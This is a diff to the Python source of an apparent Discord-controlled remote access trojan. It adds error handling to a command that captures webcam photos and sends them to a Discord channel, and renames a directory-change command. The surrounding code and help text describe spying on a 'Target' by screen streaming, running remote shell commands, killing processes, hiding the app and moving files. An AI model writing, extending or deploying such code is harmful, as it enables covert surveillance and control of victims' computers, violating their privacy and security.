@@ -175,18 +175,21 @@ async def ss(ctx, numberofphoto: int):
 @bot.command(name="ws")
 async def webcamshot(ctx, numberofphoto: int):
     if control_channel(ctx) == True:
-        number = 0
-        wbshot = cv2.VideoCapture(0)
-        while not number == numberofphoto:
-            number += 1
-            return_value, image = wbshot.read()
-            cv2.imwrite(temp_path + "\\webcamshot.png", image)
-            webcamshotpng = temp_path + "\\webcamshot.png"
-            wbshotpng = discord.File(webcamshotpng, filename="webcamshot.png")
-            await ctx.channel.send(file=wbshotpng)
+        try:
+            number = 0
+            wbshot = cv2.VideoCapture(0)
+            while not number == numberofphoto:
+                number += 1
+                return_value, image = wbshot.read()
+                cv2.imwrite(temp_path + "\\webcamshot.png", image)
+                webcamshotpng = temp_path + "\\webcamshot.png"
+                wbshotpng = discord.File(webcamshotpng, filename="webcamshot.png")
+                await ctx.channel.send(file=wbshotpng)
 
-        wbshot.release()
-        cv2.destroyAllWindows()
+            wbshot.release()
+            cv2.destroyAllWindows()
+        except:
+            await ctx.send("```No cam found...```")
 
 
 @tasks.loop(seconds=1/30)  # For 30FPS.(Recommened.)
@@ -228,7 +231,7 @@ async def stream(ctx):
                     await channel.send('```Stream Started!```@everyone')
 
         except Exception as e:
-            await ctx.channel.send(f"```Error :\n {e} ``` ")
+            await ctx.send(f"```Error :\n {e} ``` ")
 
 
 @bot.command(name="stopstream")
@@ -327,7 +330,7 @@ async def command(ctx, *args):
             await ctx.channel.send(f"```Error :\n {e} ``` ")
 
 
-@bot.command(name="gofile")
+@bot.command(name="cd")
 async def listfile(ctx, *args):
     if control_channel(ctx) == True:
         try:
@@ -866,7 +869,7 @@ async def helpmsg(ctx):
 !stopstream :Stop Real Time Photos.
 !video (second) : Record Video.
 !ps (command) : Sends Commands to Target.
-!gofile (folder name) : Change Directory With That.
+!cd (folder name) : Change Directory With That.
 !kill (procces) : Kill a Task.
 !hide : Hide App.
 !setlang (lang code) : Set Language Before Using !say. 
@@ -895,7 +898,7 @@ DO NOT FORGET TO GIVE SECONDS OR NUMBERS!
     example usage : !get (the file path.)
     example usage : !wallpaper (any picture file.)
     example usage : !kill (procces.)
-    example usage : !gofile (folder.)
+    example usage : !cd (folder.)
     example usage : !ps (command.)
     example usage : !website (https://google.com)
     example usage : !upload (file.)
@@ -982,3 +985,4 @@ Example: md NewFolder
 
 
 bot.run(token)
+
